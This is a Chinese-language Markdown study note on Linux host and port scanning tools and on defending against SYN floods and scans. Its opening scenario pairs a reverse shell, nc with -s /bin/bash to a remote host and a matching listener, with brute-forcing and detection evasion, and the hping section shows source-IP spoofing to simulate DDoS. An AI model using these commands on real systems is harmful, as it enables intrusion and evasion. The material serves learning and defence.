# Linux系统扫描和安全防范

## 场景介绍
1. tracert 路由跟踪，找到是否有走内网的核心设备转发
2. nmap端口扫描
3. 暴力破解，弱口令破解
4.	登录到管理界面后，尝试用nc命令惊醒交互式shell操作
	- `nc 10.0.0.112 2005 -s /bin/bash`: 连接10.0.0.112的2005端口，并把命令终端环境传到10.0.0.112
	- `nc -lvp 2005`: 在10.0.0.112上监听2005端口

- 不用频繁通过界面去登录而留下痕迹
- 登录方便
- 不会呗侦测设备侦测到

## 主机扫描命令 fping
批量给目标主机发送ping请求，测试主机的存活情况
- 官网地址: <http://www.fping.org>
- 下载源码包
-	编译安装，需要有gcc环境
	1. `./configure` 进行配置的测试，生成 Makefile 文件
	2. `make` 源码编译，生成二进制文件
	3. `make install` 将生成的二进制文件拷贝到系统目录下

例子
- `fping 10.0.0.110 10.0.0.112`: 查看10.0.0.110和10.0.0.112存活情况
- `fping -a 10.0.0.110 10.0.0.112`: 只显示活着的主机
- `fping -a -g 10.0.0.10 10.0.0.112`: 批量ping 10到112范围内的主机
- `fping -a -g 10.0.0.1/24`: ping某网段内的主机
- `fping -a -f f.txt`: 读取文件里面的ip来进行ping
- `fping -u -f f.txt`: 查看不能ping通的主机

## 主机扫描命令 hping
支持使用的TCP/IP数据包组装、分析工具，可以ping通屏蔽icmp包的的主机
- 官网地址: <http://www.hping.org>
- 下载源码包
- 需要依赖libpcap-devel，因此需要使用 `yum install libpcap-devel` 或是下载rpm包，使用 `rmp -ivh 文件.rpm`
- 编译安装

> 如果报告缺少 net/bpf.h，则需要 `ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h`

> 如果报告 /usr/bin/ld: cannot find -ltcl 则需要 tcl和tcl-devel ，使用命令 ` yum -y install tcl` 和 `yum -y install tcl-devel`

常用参数

-	对指定目标端口发起tcp探测
	- -p 端口
	- -S 设置TCP模式 SYN包
-	伪造来源IP，模拟Ddos攻击
	- -a 伪造IP地址

例子
- `hping -p 80 -S 主机名或IP`
- `hping -p 80 -S 10.0.0.112 -a 10.0.0.4`

## nmap
端口扫描工具(默认扫描0-1024以及一些常用端口)
- `-sP`: 使用icmp扫描主机或主机段是都存活，相当于fping 例`nmap -sP 10.0.0.0/24`
- `-sS`: 使用tcp syn半开放扫描，高效，不易检测，通用 例`nmap -sS 10.0.0.1`
- `-sT`: 使用tcp connect()扫描，真实可靠
- `-sU`: UDP协议扫描，有效透过防火墙策略
- `-p 端口范围`: 指定扫描端口

## traceroute路由跟踪
- 默认使用的是UDP协议（30000以上的端口）,windows下面默认使用icmp
- 使用TCP协议 -T -p
- 使用icmp协议 -I

例子
- `traceroute www.imooc.com`: 查看路由
- `traceroute -n www.imooc.com`: 查看路由，不解析名字
- `traceroute -In www.imooc.com`: 使用icmp协议
- `traceroute -Tn -p 80 www.imooc.com`: 使用tcp协议侦测80端口，到达目的主机后就停止

## ncat

选项
- `-w`：设置超时时间
- `-z`：一个输入输出模式
- `-v`: 显示命令的执行过程
- `-u`: 基于udp协议

例子
- 基于tcp协议(默认): `nc -v -z -w2 10.10.250.254 1-50`
- 基于udp协议-u: `nc -v -u -z -w2 10.10.250.254 1-50`

## tcpdump
抓取数据包
- `tcpdump -np -ieth0`: 监听eth0网卡上的数据包
- `tcpdump -np -ieth0 src host 10.0.0.112`: 监听eth0网卡上来自10.0.0.112的数据包

## 防攻击
-	减少发送syn+ack包时重试次数(默认是5次)
	- `sysctl -w net.ipv4.tcp_synack_retries=3`
	- `sysctl -w net.ipv4.tcp_syn_retries=3`
	- 上面是临时的，直接改配置文件 `/etc/sysctl.conf`
-	SYN cookies技术
	- `sysctl -w net.ipv4.tcp_syncookies=1`
-	增加backlog队列(默认为512)
	- `sysctl -w net.ipv4.tcp_max_syn_backlog=2048`

其他预防策略
- 关闭icmp协议请求
	- `sysctl -w net.ipv4.icmp_echo_ignore_all=1`
- 通过iptables防止扫描
	- `iptables -A FORWARD -p tcp -syn -m limit --limit 1/s --limit-burst 5 -j ACCEPT`
	- `iptables -A FORWARD -p tcp --tcp-flags SYN,ACK,FIN,RST RST -m limit --limit 1/s -j ACCEPT`
	- `iptables -A FORWARD -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT`

## rpm
- `rpm -qa`: 查看系统中安装的全部rpm包
- `rpm -ivh 文件.rpm`: 安装rpm包
- `rpm -qf /bin/traceroute`: 查看traceroute的安装包

## rpm软件包资源网址
<http://www.rpmfind.net>